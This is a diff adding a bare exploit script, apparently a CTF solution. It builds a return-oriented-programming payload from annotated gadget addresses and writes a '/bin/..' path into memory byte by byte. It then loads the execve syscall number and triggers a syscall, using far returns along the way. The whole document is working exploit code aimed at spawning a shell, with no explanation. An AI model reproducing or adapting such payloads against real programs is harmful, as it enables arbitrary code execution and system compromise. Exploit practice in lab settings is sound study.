@@ -1,0 +1,89 @@
+payload = p64(0x40d2aa)
+#0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x423258)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x80)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x423058)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x2f)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x423059)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x62)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305a)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x69)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305b)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x6e)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305c)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x2f)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305d)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x66)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305e)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x68)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x40d2aa)
+# 0x000000000040d2aa: pop rcx; ret; 
+payload += p64(0x42305f)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x0)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x41d5ef)
+# 0x000000000041d5ef: add byte ptr [rcx], al; ret; 
+payload += p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x36b2306d)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x401314)
+# 0x0000000000401314: add edx, dword ptr [rax - 0x366ffe15]; ret; 
+payload += p64(0x40cdb6)
+# 0x000000000040cdb6: pop rsi; ret 0; 
+payload += p64(0x0)+p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x3b)+p32(0x40cec9)+p32(0x33)
+# 0x000000000040cec9: xchg edi, eax; ret; 
+payload += p64(0x416343)
+# 0x416343: pop rdi ; retf
+payload += p64(0x423058)+p32(0x406205)+p32(0x33)
+# 0x0000000000406205: syscall; 
+payload += b''
